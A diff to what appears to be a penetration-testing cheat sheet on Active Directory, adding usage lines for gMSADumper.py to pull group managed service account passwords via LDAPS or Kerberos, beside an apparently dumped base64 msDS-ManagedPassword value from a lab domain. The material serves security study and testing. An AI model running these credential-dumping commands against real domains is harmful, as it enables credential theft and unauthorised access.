@@ -39,4 +39,12 @@
  msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
 ```
 ### [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper)
+> gMSADumper.py requires LDAPS, which normally won't be available through linux
+ ```bash
+ # With Username and password
+ python3 gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
+ 
+ # With Kerberos
+ python3 gMSADumper.py -k -d vintage.htb -l dc01.vintage.htb
+ ```
 
